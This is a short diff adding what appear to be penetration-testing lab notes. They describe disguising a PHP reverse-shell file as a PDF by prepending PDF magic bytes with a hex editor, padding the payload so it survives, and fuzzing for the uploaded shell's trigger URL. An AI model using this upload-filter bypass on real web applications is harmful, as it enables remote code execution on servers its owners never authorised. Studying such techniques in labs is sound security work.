@@ -1,1 +1,9 @@
+Magic Bytes
+Successfully used magic bytes to fool the upload function into thinking php-reverse-shell.php was .pdf
 
+└─$ hexeditor -b php-reverse-shell.php   <--- Ended up putting in  25 50 44 46 2D (PDF) 
+https://en.wikipedia.org/wiki/List_of_file_signatures
+I added an additional ..... (five) dots so the php payload does not get affected by inserting 25 50 44 46 2D via hexeditor -b, dont forget the -b 
+.....<?php
+
+/backend/default/uploads/php-reverse-shell.php <----Had to go back and fuzz to find trigger url. /uploads/php-reverse-shell.php
